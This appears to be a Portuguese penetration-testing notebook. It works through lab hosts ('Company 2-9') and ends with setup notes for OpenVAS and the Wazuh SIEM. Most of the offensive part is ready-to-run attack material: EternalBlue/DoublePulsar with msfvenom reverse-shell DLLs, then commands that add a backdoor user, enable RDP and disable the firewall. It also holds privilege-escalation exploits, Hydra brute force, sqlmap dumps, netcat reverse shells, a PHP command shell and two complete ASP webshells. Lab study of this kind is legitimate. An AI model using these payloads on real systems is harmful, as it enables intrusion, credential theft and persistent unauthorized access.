	sudo dhclient wlan0
	sudo route add default gw 192.168.10.1 dev wlan0
	network={
	  	  ssid="Capcana Wi-fi"
		  key_mgmt=NONE
	  	  priority=100
	  }
	
	ip addr add 10.0.0.210/24 dev enp2s0
	ip route add default via 10.0.0.2
	ip link set enp2s0 up
 
THAT'S ALL FOLKS

### HANDS ON

- Company 2

Host Second: 

        https://www.100security.com.br/ms17-010 #eternalblue #doublepulsar 

192.168.1.145

Alternativo Host Company 2 145:  

        https://github.com/sailay1996/eternal-pulsar

Fazer o clone do repositório e entrar na pasta depens.

	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=8080 -f dll > shell.dll

Cria payload para shell reverso

	wine cmd

Em outro terminal: 

        rlwrap nc -vnlp 8080

No terminal do wine:

	Eternalblue-2.2.0.exe --TargetIp 192.168.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt

	Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 192.168.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll

Os dois comando acima vai mandar a shell no terminal que tava com a porta aberta pelo nc


Na shell do alvo: 

        net user suporte 12345

        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

        NetSh Advfirewall set allprofiles state off

.

	rdesktop 192.168.1.145 

Acessa a máquina com login e senha criado acima

192.168.1.140

Elevar privilégios para acessar as pastas do... Após descobrir a Vulnerabilidade DiffieHellman pesquisar exploit... e prosseguir com as máquinas…

    https://github.com/jas502n/CVE-2019-1388

Seguir o tutorial

        Abrir o arquivo.exe 

            -> abre o link do certificado 

                -> Salva a página no system32/cmd.exe e abrirá a shell com privilégios administrativos.

Navegar pelas pastas e abrir o WinScp.exe que vai dar acesso ao host 192.200.10.5

192.200.10.5

Elevar privilégios no host - Nmap Exploit

https://w0lfram1te.com/privilege-escalation-with-nmap

    sudo -l 
    sudo nmap --interactive
    nmap> !sh
    cat /etc/passwd e shadow

Captura as hashes e encontra a senha para o host 192.200.10.8 homologacao

192.200.10.8

Elevar privilégios no host - Kernel Exploit

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

    cat /proc/version 
    searchsploit "linux-version"
    https://github.com/xiaoxiaoleo/CVE-2009-2698
    
importar o arquivo no alvo (dar permissão) e executar



- Company 3

Hosts:

192.168.1.240

Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o exploit abaixo

    https://github.com/IvanGlinkin/CVE-2006-3392

Ao pegar o shadow e passwd, quebrar as senhas e acessar o server via ssh,ftp...


- Company 4

192.168.1.116

Ao descobrir as tecnologias e portas abertas, procurar por algo na url que permita mandar um arquivo pra dentro da máquina... O `acs_path=` É encontrado no código fonte como hidden

Fazer um exploit com `msfvenom em php/reverse_php > config.php` (esse config é o arquivo que a vítima pega por padrão) abrir server http com python e deixar escutando na porta do exploit com netcat e inserir na URL `vitma/adm.php/ACS_path=IP-ATACANTE:porta-do-srv-http/`

PrivEsc do host 116

Varredura com o `less.sh` que mostra as possíveis vulnerabilidades e exploits

Após achar um exploit `dirtcow rootcow.c` ajustar para 32bits e executar

    gcc -m32 cowroot.c -o cowroot -pthread -static 

Gera o executável (instalar pacote gcc-multilib se necessário)

192.168.1.195

Após analisar a aplicação com acesso admin, no campo de upload de arquivo pode se enviar um comando em php para a máquina usando um modelo de arquivo csv, separado por vírgula.

Após enviar uma shell reversa com NC, fazer uma enumeração do host usando less, linpeas e procurar vulnerabilidades.

comando com problema achado no linpeas -> /bin/bash -p

Site para procurar comando de escalar privilégios

        https://gtfobins.github.io/gtfobins/bash/


Site para montar shell reverso https://www.revshells.com/


- Company 5

Host: 192.168.1.158

Bruteforce usado Hydra

	hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I

Exploit 45010 encontrado pelo less.sh

    unoconv --format=docx Administrator.doc 

Converter documentos antigos do WORD Office

Quebrar senha xls planilha scheets:

        https://www.password-find.com/crack_office_password_js.htm


- Company 6

192.168.1.110

Bruteforcer: crowbar brute force alternativo do hydra mas inferior

Exploit for rdp windows

        https://github.com/BlackMathIT/Esteemaudit-Metasploit 

kiwi e pega as creds necessárias

192.168.1.120

Não é necessário Exploit vuln cuppa cms?

        https://www.exploit-db.com/exploits/25971


Exploração via Kernel usando o metasploit com banco de dados, abrindo sessão com ssh_login  e usando a sessão para o exploit:

    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/freebsd/local/intel_sysret_priv_esc.rb

Ajuda: https://mysnippets443.wordpress.com/2020/03/09/metasploit-establish-a-ssh-session-for-further-use/


- Company 7          

192.168.1.139

ENUMERACAO com nmap, dirb e metasploit

Procura pela internet por exploits:

https://www.exploit-db.com/exploits/14641 - Dir Transversal

https://www.exploit-db.com/exploits/50057 - RCE

192.168.1.156

ENUMERACAO com nmap, dirb e metasploit

Login e senha encontrado no lab anterior

Upload de payload .war e ganha a shell


- Company 8


192.168.1.155 

Bruteforce no host com:

        Dirb no host com -X .pdf,.html,.txt,.htm

Metasploit 

        Com ipfire oinkcode
Client for FTP portable 

	https://www.ncftp.com/download/ 

	curl -v –disable-epsv -u user:pass ftp://192.300.10.101:2221/Inetpub/ 

Conectar FTP via curl

    curl -v -T "shell.asp" -u user:pass ftp://192.300.10.101:2221/Inetpub/ 

PUT via CURL

    meterpreter> portfwd add -l 8088 -p 80 -r 192.300.10.101 

Redirecionamento de portas `8088` local da 80 remota OU
add regra no firewall: `any` de fora para `NAT 192.16.1.10` na  porta dest `2221`. 
Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.168.1.10 na mesma porta

Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 192.200.10.101 que é o server interno do firewall que foi criado a regra.


- Company 9

192.168.1.159

Joomla... https://www.exploit-db.com/exploits/47465 adaptado

        python2 joomla-expl.py -t http://192.168.1.10/ --exploit --lhost 192.10.1.10 --lport 445

Depois do comando com o nc 445 aberto pega a shell reversa

        getcap -r / 2>dev/null 

Analisa saída

    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

    https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c 

PRIVESC

PrivEsc com capabilities 

        https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/


192.168.1.148

Exploit da tecnologia usada no server drupa7-CVE-2018-7600.py (executa compilação no server alvo)

NC Portable

        https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat

Escalar privilegios com 

        https://www.exploit-db.com/exploits/37292 (pega a shell root)


Nota: Quando aparecer no gcc o erro undefined reference to 'openpty' usar a flag no gcc -lutil no fim 

Ao compilar opte por compilar no alvo e se nao funcionar compila na sua máquina

Notas: DirtyCow - PrivEsc:

https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c Exploit PrivEsc

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

https://security.stackexchange.com/questions/145325/exploiting-dirty-cow-using-metasploit


- Company 1

    script nomedoarquivo

Salva/grava todo terminal até da EXIT

    nmap --min-rate=60000

Envia/aumenta ao envio de pacotes para o host (detecção mais rápida)

    gobuster dir -u http://kidman.com.br -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -x php,bkp,old,txt,xml

Bruteforce nos diretórios do domínio com 100 threads url completa sem retorno de erro, seguir caminho de redirecionamento e gravar tudo no arquivo gobuster com tipos de arquivos, dessa forma procurando por entry points.


Nota: Seclists baixar pasta de wordlists do github

    wc -l arquivo 

Retorna a quantidade de linhas no arquivo

    hydra -v -t10 -l kidman -P wordlist ftp://kidman.com.br -s 2121 

Faz um ataque de força bruta usando o hydra com 10 threads na porta 2121 (diferente da padrão)

Nota: Processo de força bruta com o BurpSuite send to intruder->clear_all->add_field->payload->options

    nc -v -C site.com.br 

Mantém o terminal aberto.


    echo "http://website.com" | /root/go/bin/html-tool atribs src href | grep -i ".js" /root/go/bin/getJS --url http://web.site.com/redirecionamento.php --complete

Ferramenta parsing website no github.com/tomnomnom e getJs para subir arquivos JS


Nota: Em uma URL com final e.x: ...downloads.php um possível teste de vulnerabilidade é testar com downloads.php?file=downloads.php (esse produtos.php é o arquivo que você quer analisar) "no for use \? para não interpretar" e nisso descobrir se há vulnerabilidade, o nome file pode estar em uma wordlist para rodar até encontrar o parâmetro correto. Outro teste que pode ser feito é colocar file=/../../../../../../etc/passwd

Nota: Instalar pacote de wordlists apt install seclists e selecionar a lista para usar no burp cp /usr/share/wordlists/seclists/Discovery/Web-content/burp-parameter-names.txt burp-param.txt

    wfuzz -c -z file,burp-param.txt --hl 0 http://site.com/downloads.php?FUZZ=download.php 

Faz uma procura pelos parâmetros da lista na tentativa de encontrar um parâmetro vulnerável e explorá-lo e após encontrar o payload correto, tente colocar/navegar para encontrar outros arquivos e visualizando o código fonte.

    http://site.com/produtos.php?id=10 and 2=2# 

Testes direto na URL de validação do banco de dados, se o banco retornar com a página mostrando aquele id é possível explorar o banco através de blind sql injection. 

    http://site.com/produtos.php?id=10 and(select*from*(select(sleep(10)))asdasd)#

Outro modo de validação, se o banco demorar 10 segundos para responder é um indício de vulnerabilidade de blind sql injection. 

    http://site.com/produtos.php?id=10 and database()=char(EmDecimalCom;)#

Validando o nome do banco de dados


## COMANDOS PARA EXPLORAR VULN DE SQL

    sqlmap -v -u "http://site.com/produtos.php?id=10" --current-db --threads=10

Analisa a database atual procurando por vulnerabilidades

    sqlmap -v -u "http://site.com/produtos.php?id=10" --dbs --threads=10

Lista as databases dentro do server

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name --tables

Lista as tabelas do banco selecionado

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name --columns

Lista as colunas da tabela selecionada

    sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name -C 'nome,email,senha' --dump

Lista os conteúdos das colunas selecionadas.

    hash-identifier cola_hash_para_descobrir 

Identifica uma hash, o tipo da hash

    echo -n "word" | md5sum 

Printa em MD5 uma palavra informada


Nota: Ferramentas para quebrar hash: hashcat, jhon 

TENTATIVA DE EXECUÇÃO DE CÓDIGO REMOTO FILE UPLOAD

    nano arquivo.php

Crie um arquivo para fazer upload no site. (com o código abaixo)

	<?php
	system($_GET['pentest']);	
	?>

    put arquivo.php 

No FTP faça upload do arquivo criado

    site.com/diretório/arquivo.php?pentest=ifconfig 

Acessar a url no diretório do arquivo e passando o parâmetro colocado no arquivo podendo executar comandos.

    cp /usr/bin/nc 

Copie o binario do netcat

    put nc 

No FTP faça o upload do netcat


Nota: Copie usando a url, o arquivo do netcat para um outro local e dê permissão 777 nele cp /tmp/ncat e depois podendo abrir uma shell reversa usando o nc em tmp.

    nc -vnlp 80 

Abra uma conexão na sua máquina

    site.com/diretório/arquivo.php?pentest=/diretorio_netcat/nc 172.52.8.7 -e /bin/bash

Mande para a sua máquina o terminal do servidor via netcat

Comandos para dar spawn um bash mais interativo

        sudo python -c 'import pty; pty.spawn("/bin/sh")'

        sudo perl -e 'exec "/bin/sh";'

        sudo ruby -e ‘exec "/bin/sh"’

        python3 -c 'import pty;pty.spawn("/bin/bash")' 


## ESCALANDO PRIVILEGIOS PRIVESC

Ao rodar o comando `sudo -l` e identificar que há permisão especial rodar `/bin/bash -p` pra tentar escalar, esse comando se dá caso alguém ja tenha executado `sudo chmod +s /bin/bash`, uma espécie de backdoor

Ao identificar que o SUDO é vulnerável `v1.8*` rodar o comando `sudo -u \#$((0xffffffff)) /bin/bash` pra tentar escalar

    find / -perm -u=s -type f 2 >/dev/null 

Procura por arquivos  com SUID BIT ativo e procurar por um arquivo diferente para tentar escalar privilégios

    echo "/bin/bash > cat 

Dentro de tmp cria uma arquivo cat com bin/bash escrito dentro (dê chmod 777)

    env 

Lista o PATH e outras infos

    echo $PATH  

Lista o caminho total do PATH

    export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp" 

Modifica o PATH para chamar o cat dentro de TMP

Agora só executar o arquivo ou se for uma cron, esperar ela rodar.


NOTA: Após comprometer um HOST e escalar privilégios, rode este comando para apresentar uma saída limpa e padrão OSCP: 

    cat /root/key.txt && hostname && id && whoami && ifconfig 


NOTA: 
Amostra sobre uma alternativa para ProxyChains o Privoxy. https://www.youtube.com/watch?v=y9iSVx4XWhQ
Alternativa para teste de LFD /..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_centisecs


## ALEATORY NOTES

Ferramenta de shell interativa web `WEEVELY`

Ferramenta para shell interativa no windows `evil-winrm -i IP -u USER -p PASS` alternativa ao xfreerdp e rdesktop, também o `wmiexec` o `impacket-psexec` e `remmina`

[Shell em asp shell.asp](https://medium.com/@viniciuskmax/backdoorando-o-iis-como-usar-uma-webshell-para-obter-persist%C3%AAncia-de-acesso-system-a-um-servidor-9180a20a1a49)

WEB Shell em asp mais interativa

	<%@ Language="VBScript" %>
	<%
	Function URLDecode(sText)
	    Dim i, sDecoded, sEncoded
	    sDecoded = ""
	    
	    For i = 1 To Len(sText)
	        sEncoded = Mid(sText, i, 1)
	        If sEncoded = "%" Then
	            If i + 2 <= Len(sText) Then
	                sDecoded = sDecoded & Chr(CLng("&H" & Mid(sText, i + 1, 2)))
	                i = i + 2
	            End If
	        ElseIf sEncoded = "+" Then
	            sDecoded = sDecoded & " "
	        Else
	            sDecoded = sDecoded & sEncoded
	        End If
	    Next
	    
	    URLDecode = sDecoded
	End Function
	
	Function ExecuteCommand(cmd)
	    On Error Resume Next
	    Dim ws, exec, output
	    
	    Set ws = Server.CreateObject("WScript.Shell")
	    If Err.Number <> 0 Then
	        ExecuteCommand = "Erro: WScript.Shell não disponível"
	        Exit Function
	    End If
	    
	    Set exec = ws.Exec("cmd.exe /c " & cmd)
	    If Err.Number <> 0 Then
	        ExecuteCommand = "Erro ao executar comando: " & Err.Description
	        Exit Function
	    End If
	    
	    output = exec.StdOut.ReadAll()
	    If output = "" Then output = exec.StdErr.ReadAll()
	    If output = "" Then output = "Comando executado (sem saída)"
	    
	    ExecuteCommand = output
	End Function
	
	' Processa o comando
	Dim cmd, output
	cmd = Request.QueryString("cmd")
	
	If cmd <> "" Then
	    cmd = URLDecode(cmd)
	    output = ExecuteCommand(cmd)
	Else
	    cmd = ""
	    output = "Digite um comando no formulário abaixo"
	End If
	%>
	
	<html>
	<head>
	<title>Webshell ASP</title>
	<style>
	body { font-family: Arial, sans-serif; margin: 20px; }
	pre { background: #f0f0f0; padding: 10px; border-radius: 5px; }
	input[type="text"] { width: 400px; padding: 5px; }
	input[type="submit"] { padding: 5px 15px; }
	</style>
	</head>
	<body>
	<h2>Webshell ASP</h2>
	<form method="GET">
	Comando: <input type="text" name="cmd" value="<%= Server.HTMLEncode(cmd) %>">
	<input type="submit" value="Executar">
	</form>
	
	<% If output <> "" Then %>
	<h3>Resultado:</h3>
	<pre><%= Server.HTMLEncode(output) %></pre>
	<% End If %>
	
	<h3>Exemplos:</h3>
	<ul>
	<li><a href="?cmd=dir%20c:\">dir c:\</a></li>
	<li><a href="?cmd=ipconfig%20/all">ipconfig /all</a></li>
	<li><a href="?cmd=net%20user">net user</a></li>
	<li><a href="?cmd=type%20c:\windows\win.ini">type c:\windows\win.ini</a></li>
	</ul>
	</body>
	</html>

.

WEB Shell em asp mais interativa

.

	<%@ Language="VBScript" %>
	<%
	' Função para decodificar URL (para comandos com espaços)
	Function URLDecode(sText)
	    sText = Replace(sText, "+", " ")
	    Dim i, pos, decoded
	    i = 1
	    Do While i <= Len(sText)
	        If Mid(sText, i, 1) = "%" And i + 2 <= Len(sText) Then
	            decoded = decoded & Chr(CLng("&H" & Mid(sText, i + 1, 2)))
	            i = i + 3
	        Else
	            decoded = decoded & Mid(sText, i, 1)
	            i = i + 1
	        End If
	    Loop
	    URLDecode = decoded
	End Function
	
	' Processar comando
	Dim cmd, output
	cmd = Request.QueryString("cmd")
	
	If cmd <> "" Then
	    cmd = URLDecode(cmd)
	    
	    ' Executar comando
	    On Error Resume Next
	    Dim ws, exec
	    Set ws = Server.CreateObject("WScript.Shell")
	    
	    ' Verificar se é um comando do netcat (começa com "nc ")
	    If LCase(Left(cmd, 3)) = "nc " Then
	        ' Executar nc.exe diretamente (assumindo que está no mesmo diretório)
	        Set exec = ws.Exec("nc.exe " & Mid(cmd, 4))
	    Else
	        ' Executar comando normal via cmd.exe
	        Set exec = ws.Exec("cmd.exe /c " & cmd)
	    End If
	    
	    If Err.Number <> 0 Then
	        output = "Erro: " & Err.Description
	    Else
	        output = exec.StdOut.ReadAll()
	        If output = "" Then output = exec.StdErr.ReadAll()
	        If output = "" Then output = "Comando executado (sem saída)"
	    End If
	End If
	%>
	
	<html>
	<head>
	<title>Webshell ASP com Netcat</title>
	<style>
	body { font-family: Arial; margin: 20px; background: #f5f5f5; }
	pre { background: #fff; padding: 15px; border: 1px solid #ddd; }
	form { background: #fff; padding: 20px; border: 1px solid #ddd; }
	input[type="text"] { width: 70%; padding: 8px; }
	input[type="submit"] { padding: 8px 15px; background: #4CAF50; color: white; border: none; }
	</style>
	</head>
	<body>
	<h2>Webshell ASP com Netcat</h2>
	
	<form method="GET">
	  Comando: 
	  <input type="text" name="cmd" placeholder="Ex: nc 192.168.1.100 4444 -e cmd.exe" value="<%= Server.HTMLEncode(cmd) %>">
	  <input type="submit" value="Executar">
	</form>
	
	<% If cmd <> "" Then %>
	<h3>Comando executado:</h3>
	<pre><%= Server.HTMLEncode(cmd) %></pre>
	
	<h3>Resultado:</h3>
	<pre><%= Server.HTMLEncode(output) %></pre>
	<% End If %>
	
	<h3>Exemplos de uso do Netcat:</h3>
	<ul>
	  <li><code>nc 192.168.161.20 4455 -e cmd.exe</code> - Shell reversa</li>
	  <li><code>nc -lvp 4444</code> - Ouvir em uma porta (se suportado)</li>
	</ul>
	
	<h3>Outros comandos úteis:</h3>
	<ul>
	  <li><code>dir</code> - Listar arquivos</li>
	  <li><code>whoami</code> - Ver usuário atual</li>
	  <li><code>ipconfig</code> - Configuração de rede</li>
	</ul>
	</body>
	</html>

- INFORMATION GATHERING

Websites for search: 

        https://consultas.plus/
        https://www.cnpj.world/
        https://urlscan.io/ 

Fuzzing de SUBDOMINIOS

        https://github.com/netsecurity-as/subfuz

Transferir arquivos do alvo para o atacante / copiar arquivos:

        netcat nc porta > file.etx | nc.exe -v ip porta < file.ext
        python httpserver
        Montar disco na maquina alvo para transferir arquivos 
        Colocar no site que tiver aberto e baixar
        Transferir via ssh scp file.ext user@ip:/home/user
	impacket-smbserver folder2share . -smb2support -> copy \\IP-SMB-SHARE\folder2share\file.ext 

TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT

        php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js
        Flag user agent  -a Mozilla/5.0

Ferramenta animal par ENUMERAÇÃO WEB

        wapiti --url http://rh.kidmancompany.com.br/

Fazendo tunelamento com NGROK

        Acessa o site: https://ngrok.com/
        Cria a conta e pega o token
        Baixa o programa e joga na pasta bin
        ngrok authtoken TOKENAQUI
        ngrok http 80
        ngrok tcp 4455
        ~/.ngok2/ngrok.yml

                tunels:
                   tunnel_1:  
                      proto: http
                      addr: 80

Salva e inicia...

        ngrok start --all: Abre as conexões configuradas no arquivo yml

## INSTALL OPENVAS | GVM | GreenBone

Openvas é um framework de scan de vulnerabiliadades

	sudo apt install -y software-properties-common
	sudo add-apt-repository ppa:mrazavi/gvm
	sudo apt update
	sudo apt upgrade
	sudo apt install gvm
	sudo gvm-setup 
	sudo gvm-check-setup
	sudo runuser -u _gvm -- greenbone-feed-sync --type SCAP
	sudo gvm-start
		
Se der erro roda esse comando:
	
	chmod 666 /var/log/gvm/openvas.log
	
Para criar o login e senha rode:	
	
	sudo runuser -u _gvm -- gvmd --create-user=Admin --new-password=admin
	
Ficar atento às informações de resultado dos comandos e posteriormente `https://localhost:9392`

Primeiras configurações: 
	
	Criar um portscan avançado e um filtro de resultados avançado e setar os alvos
	Para criar o portscan vai em: Configuration -> Port Lists -> clica em novo -> Nomeia e Seta todas as portas UDP e TCP
	Para criar o filtro vai em: Configuration -> Filters ->  -> clica em novo -> Nomeia e Seta o tipo como Result	
	Para setar os alvos vai em: Configuration -> Targets -> Clica novo -> PortList selecina a criada anteriormente -> Depos em Consider Alive
	Para setar um ScanConfig vai em: Configuration -> ScanConfig -> Cria novo -> seleciona Full and Fast
	Para iniciar um scan vai em: Scan -> tasks -> New -> Scan Target:TargetCreated -> MinQoD:0% -> ScanConfig:FullandFast -> scan type: GVM default

Em caso de apresentar erro ao fazer um scan ou criar algum configuração de scaneamento - Failed to find config 'daba56c8-73ec-11df-a475-002264764cea'
	
	sudo runuser -u _gvm -- gvmd --get-users --verbose
	sudo runuser -u _gvm -- gvmd --get-scanners
	sudo runuser -u _gvm -- gvmd --modify-scanner [SCAN ID] --value [USER ID]

[ALTERNATIVA](https://greenbone.github.io/docs/latest/22.4/source-build/troubleshooting.html#failed-to-find-scan-configuration)


- UPDATE OPENVAS

Comandos para atualizad o GreenBone

	sudo apt update && sudo apt upgrade
	sudo reboot
	sudo greenbone-feed-sync
	sudo gvm-check-setup
	sudo gvm-start

Rodar todos esses comandos com atenção e observando se tudo está ok. Após rodar, acessar a web novamente e gerar os relatórios

Erro na interface web, não carrega em outro dispositivo na rede 

    cd /lib/systemd/system
    nano greenbone-security-assistant.service TROCA 127.0.0.1 pelo IP local e PORTA pela 443
    sudo gvm-stop
    sudo gvm-start
    
O comando é usado para trocar o IP localhost por um ip de preferência

    openssl s_client -connect 10.1.1.10:443

Verificar se a conexão está ok

    $INSTALL_PREFIX/var/log/gvm/gsad.log

Verificar os logs

Notes: Quando rodar o Check-Setup e aparecer a mensagem "the default postgresql version is not the one used for gvmd compilation: (16, need 17)" Rode os comando `sudo pg_lsclusters` e de acordo com a saída voce pode parar o mais antigo `sudo pg_ctlcluster 17 main stop` ou todos que estiverem rodando, caso apareça "target cluster 17/main already exists" quando der upgrade, tente renomear `sudo pg_renamecluster 17 main test` depois dê um upgrade no que o GVM pediu `pg_upgradecluster 16 main` e depois rode e `sudo systemctl restart postgresql` -> `sudo greenbone-feed-sync` -> `sudo gvm-check-setup` depois pode acessar a web.

	
- Gerar relatório

1- Primeiro passo é filtrar todas as informações, para isso pode ser criado um filtro

2- Acessa o scan que deseja fazer o relatório e vai em `results` e espera carregar, todos os dados devem aparecer, results, hosts, vulns...

3- Em caso de nao aparecer todas as informações do scan, deve se aguardar para ver se em `feed status` ainda está como `in progress`

4- Em Administration -> feed status em pode ainda estar `in progress` e caso esteja, o que pode ser feito é rodar o feed-update de novo 

4.1- Ou Esperar aparecer `current` em todos os campos do feed status (isso pode demorar uma hora ou mais)

Depois de tudo OK Acessa o terminal

	cd /tmp/
	sed -i"" "s/DEFAULT_TIMEOUT = 60/DEFAULT_TIMEOUT = 999999/g" /usr/lib/python3/dist-packages/gvm/connections.py
	cp /home/user/gen_report_full.py /tmp/
	sudo -u _gvm gvm-script --gmp-username user --gmp-password "P@ss" socket --socketpath /var/run/gvmd/gvmd.sock /tmp/gen_report_full.py 15ce5a51-43ef-465a-a4d3-b65dd1d0d61f /tmp/COMPANY_NETWORK_IP_DATE
	pip3 install OpenVAS-Reporting && pip install gvm-tools
	openvasreporting -i /tmp/COMPANY_NETWORK_NW_DATE.xml -o /tmp/COMPANY_NETWORK_IP_DATE  -f xlsx

Problemas que podem acontecer e possíveis soluções

Primeira dica é rodas os comandos acima novamente e se mesmo assim não der certo, voce pode tentar atualizar o GVM e etc

Caso aprensente algum erro, como por exemplo `Remote manager daemon uses an unsupported version of GMP. The GMP version was 22.5`, pode-se tentar atualzar o [Python-GVM](https://greenbone.github.io/python-gvm/install.html#using-pip) Existem 3 opçoes de instalação, se necessário tente todas. Mas uma boa alternativa é `python3 -m pip install --user python-gvm --upgrade`


## DEPLOY RAPIDO DE UM SIEM WAZUH


 Olá, comandos rápidos para configurar um WAZUH sem complicação.

Após o servidor [LINUX Debian Based] estiver configurado e pronto para uso, rode os seguintes comandos:

REF: https://documentation.wazuh.com/4.3/quickstart.html


        curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a 

        Vai aparecer o login e senha -> anote-os


Vai no navegador e acesse: https://<server-ip> Coloque o login e senha anteriormente anotado.

Ao acessar o dashboard, vai em Agents e configure de acordo com o ser server a ser monitorado, exemplo de Linux 64bits Ubuntu

Antes de rodar o comando abaixo, trocar o IP par ao IP do seu servidor WAZUH

- Adicionar Agents no Wazuh

Obs.: Repetir este processo para a config dos demais servers `Debian Based`

    curl -so wazuh-agent-4.3.10.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.3.10-1_amd64.deb && sudo WAZUH_MANAGER='192.168.2.100' WAZUH_AGENT_GROUP='default' dpkg -i ./wazuh-agent-4.3.10.deb

    sudo systemctl daemon-reload
    sudo systemctl enable wazuh-agent
    sudo systemctl start wazuh-agent
    sudo systemctl start wazuh-manager

Antes de rodar o comando abaixo, trocar o IP par ao IP do seu servidor WAZUH

Obs.: Repetir este processo para a config dos demais servers `WINDOWS`

	Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.3.11-1.msi -OutFile ${env:tmp}\wazuh-agent-4.3.11.msi; msiexec.exe /i ${env:tmp}\wazuh-agent-4.3.11.msi /q WAZUH_MANAGER='192.168.1.10' WAZUH_REGISTRATION_SERVER='192.168.1.10' WAZUH_AGENT_GROUP='default' 
	NET START WazuhSvc

Caso apresente algum erro, olhar:

    sudo cat /var/ossec/logs/ossec.log

Se os agents não comunicam com o Wazuh verifique com os comandos abaixo, o segundo é no agente [see more](https://documentation.wazuh.com/current/user-manual/agents/agent-connection.html)

     /var/ossec/bin/agent_control -i <YOUR_AGENT_ID> | grep Status
     sudo grep ^status /var/ossec/var/run/wazuh-agentd.state

Se for deletar um agente para instalar um novo agente atualizado do wazuh, e o agente linux apresentar erro no serviço: failed with result 'exit-code' failed because the control process exited with error code journalctl -xe

	Acesse o ossec.conf no agente e verifique o IP, se tiver WAZUH Manager IP, troque pelo IP ou DNS do servidor Wazuh

Se o erro for relacionado ao MANAGER_IP
Acessar:

    sudo nano /var/ossec/etc/ossec.conf

    E trocar o MANAGER_IP Pelo ip do servidor WAZUH

Modificar o arquivo para habilitar alertas adicionais

    nano /var/ossec/etc/ossec.conf

- Para remover deletar agents do WAZUH

      sudo /var/ossec/bin/agent_control -l
      /var/ossec/bin/manage_agents -r [ID_do_Agente]

- Manutenção do Wazuh (Wazuh Dashboard not ready)

      sudo systemctl edit wazuh-indexer  and add the following lines:
         [Service] 
         TimeoutStartSec=180
      sudo systemctl daemon-reload 
      sudo systemctl restart wazuh-indexer
      sudo systemctl restart wazuh-dashboard

- Manutenção do Wazuh (liberação de espaço de disco)

        systemctl stop wazuh-manager

Para o serviço do Wazuh

        find /var/ossec/logs/archives/ -type f  -mtime +1 -exec rm -f {} \;
        find /var/ossec/logs/alerts/ -type f  -mtime +1 -exec rm -f {} \;

Roda os comandos para deletar boa parte dos logs

        find /var/ossec/logs/archives/ -type f  -mtime -15 -exec rm -f {} \;
        find /var/ossec/logs/alerts/ -type f  -mtime -15 -exec rm -f {} \;

Caso ainda não seja o suficiente com os comando anteriores, rodar esses para apagar tudo

	curl -XGET https://<ipwazuh>:9200/_cat/indices -k -u <user>:<pass>
	curl -XDELETE https://<ipwazuh>:9200/wazuh-alerts-4.x-2022.04.* -k -u <user>:<pass> 

Liberando mais disco: Os comandos acima servem ver os indexes no SIEM e para deletar os idices de acordo com o mes passado, respectivamente.
 
	systemctl restart wazuh-manager

Restarta o serviço

Caso esteja incecessíel pelo IP do servidor. Ou seja, funcionando apenas no localhost, reinicie o servidor `sudo reboot`

- Silenciar alertas no Wazuh

Alterar o arquivo local do servidor

	nano /var/ossec/etc/rules/local_rules.xml

       <rule id="100002" level="0">
    	   <if_sid>60106</if_sid>
    	   <description>Rule to ignore the log</description>
       </rule>
  
- Ativar Sysmon no windows para melhorar os alertas do WAZUH

      Invoke-WebRequest -Uri https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml -OutFile C:\Windows\config.xml

Roda no RowerShell como administrador

      https://download.sysinternals.com/files/Sysmon.zip

Baixa o sysmon.exe para rodar o comando posterior via CMD como administrador

      sysmon64.exe –accepteula –i c:\windows\config.xml

Roda via CMD como ADM o comando acima para ativar as configs do arquivo

    <localfile>
       <location>Microsoft-Windows-Sysmon/Operational</location>
       <log_format>eventchannel</log_format>
    </localfile>

Colar o código acima nas configs do Wazuh (ossec.conf)

Adicionar ao arquivo `local_rules` o código abaixo

  	sudo nano /var/ossec/etc/rules/local_rules.xml

	<group name="sysmon,">
	 <rule id="255000" level="12">
	 <if_group>sysmon_event1</if_group>
	 <field name="sysmon.image">\\powershell.exe||\\.ps1||\\.ps2</field>
	 <description>Sysmon - Event 1: Bad exe: $(sysmon.image)</description>
